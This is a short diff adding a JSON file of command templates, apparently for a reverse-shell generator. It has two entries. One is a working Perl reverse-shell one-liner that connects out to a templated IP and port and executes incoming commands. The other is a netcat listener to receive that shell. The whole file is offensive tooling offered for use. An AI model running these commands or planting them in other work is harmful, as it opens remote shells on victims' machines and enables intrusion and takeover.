@@ -1,0 +1,14 @@
+{
+  "commands": [
+    {
+      "title": "Perl Reverse Shell (No sh)",
+      "template": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
+      "description": "Perl reverse shell without using sh, connecting back to IP {ip} on port {port}."
+    },
+    {
+      "title": "Netcat Listener",
+      "template": "nc -lvnp {port}",
+      "description": "Listener to catch the reverse shell on port {port}."
+    }
+  ]
+}
